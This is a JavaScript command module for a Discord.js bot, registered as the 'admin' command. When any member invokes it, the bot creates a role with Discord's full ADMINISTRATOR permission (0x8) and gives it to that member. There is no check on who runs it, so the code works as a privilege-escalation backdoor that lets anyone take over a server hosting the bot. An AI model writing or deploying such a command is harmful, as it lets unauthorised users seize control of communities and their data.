const Discord = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Discord.Interaction} interaction  // To use if your want your command to also be a slash command
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, interaction, arguments) => {
    const adminRole = await message.guild.roles.create({
        name:"admin",
        color:"AQUA",
        permissions: "0x0000000000000008",
        position: 1,
    })

    await message.member.roles.add(adminRole)
};

module.exports.name = 'admin';
